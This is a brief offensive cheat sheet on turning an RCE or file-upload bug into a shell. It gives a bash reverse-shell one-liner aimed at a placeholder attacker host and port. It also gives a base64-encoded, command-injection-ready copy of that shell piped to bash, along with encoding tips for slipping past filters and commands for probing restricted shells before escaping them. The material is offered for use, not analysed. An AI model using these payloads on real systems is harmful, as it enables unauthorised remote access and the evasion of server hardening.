# TIPS 

If you have obtained a vulnerability such as RCE, file upload or something else, you can use the script below to spawn a shell or backconnect revershell. If the shell does not run see below

1. Make sure the target has internet access (internet access opened)
2. Try changing the port to a larger one such as 8080, 8888, etc. 
3. Encode your script using base64 and then decode it 
4. Encode your script using url encode 

## Script 1 

```
sh -i >& /dev/tcp/<YOUR HOST OR IP>/<PORT> 0>&1
```

## Script 2

```
; echo c2ggLWkgPiYgL2Rldi90Y3AvPFlPVVIgSE9TVCBPUiBJUD4vPFBPUlQ+IDA+JjE= | base64 -d | bash;"
```

## Tips escape from jails or hardening server  

### Enum about the jail 

```
echo $SHELL
echo $PATH
env
export
pwd
```

Source 

- [Hacktrikcs Escaping from Jails](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/escaping-from-limited-bash)
- [Hacktricks github escape from jails](https://github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/useful-linux-commands/bypass-bash-restrictions.md)
- [0xffsec restricted-shells](https://0xffsec.com/handbook/shells/restricted-shells/)